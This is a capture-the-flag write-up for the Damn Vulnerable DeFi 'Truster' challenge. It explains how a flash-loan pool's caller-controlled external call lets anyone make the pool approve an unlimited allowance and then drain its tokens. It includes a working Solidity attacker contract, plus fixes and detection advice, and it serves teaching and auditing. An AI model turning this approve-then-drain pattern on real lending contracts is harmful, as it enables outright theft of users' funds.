# Truster - Letting the Borrower Choose What the Pool Calls

**Challenge:** Damn Vulnerable DeFi v4 — Truster
**Category:** Arbitrary External Call / Unauthorized Approval
**Severity:** Critical (every token in the pool is stolen, by anyone, in one transaction)

## What's going on

A lending pool holds 1 million DVT and offers free flash loans. You start with nothing
and must move all the tokens to a recovery account in a single transaction. The pool has
no admin functions and no obvious way to take funds out, but it does let the caller make
it call arbitrary contracts.

## The bug

`flashLoan` accepts four arguments from the caller and trusts all of them:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external nonReentrant returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) revert RepayFailed();
    return true;
}
```

`target.functionCall(data)` is an arbitrary external call made by the pool, with a
destination and calldata the caller chose. Inside that call `msg.sender` is the pool. So
the caller can make the pool do anything the pool is allowed to do, including calling the
token contract on its own behalf.

The only safety check afterwards is that the pool's balance did not drop. That check
looks at tokens leaving, but not at permissions being granted. An allowance changes
nothing about the balance, so it passes.

## The attack

1. Call `flashLoan(0, attacker, token, data)` where `data` is
   `approve(attacker, type(uint256).max)`.
2. The loan amount is 0, so no tokens move and `RepayFailed` cannot trigger.
3. The pool executes `token.approve(attacker, max)` as itself, so the attacker now has an
   unlimited allowance over the pool's tokens.
4. Call `token.transferFrom(pool, recovery, token.balanceOf(pool))` and take everything.

The challenge allows exactly one player transaction, so steps 1 to 4 are done in the
constructor of an attacker contract. Deploying the contract is the single transaction.

## PoC

```solidity
function test_truster() public checkSolvedByPlayer {
    new TrusterAttacker(pool, token, recovery);
}

contract TrusterAttacker {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        bytes memory data = abi.encodeCall(token.approve, (address(this), type(uint256).max));
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}
```

Full test file: `test/truster/Truster.t.sol`

## Why I'm calling this Critical

- **Total loss of funds.** 100% of the pool ends up with the attacker, not a DoS.
- **No privileges, no capital.** A zero-amount loan costs nothing but gas.
- **One transaction.** There is no window to react or pause.
- **Trivial to find and exploit.** An arbitrary call with caller-controlled calldata is
  one of the first things any attacker looks for.

## Fix

- Do not let the caller choose the `target` and `data` for a call the pool makes as
  itself. Call a fixed callback such as `onFlashLoan` on the borrower, as ERC-3156 does.
- If arbitrary calls are unavoidable, forbid the token (and any contract the pool holds
  privileges on) as a target.
- Check more than the balance after the callback. At minimum, a pool that holds funds
  should not be able to grant allowances over them from inside a user-controlled call.

## Takeaway

Search for `.call(`, `.functionCall(` and `delegatecall` where the target or calldata
comes from a function argument. If the contract holds funds or privileges, the caller
can usually make it spend them. Also remember that balance checks do not catch
permission changes: approvals, role grants and ownership changes all leave balances
untouched.
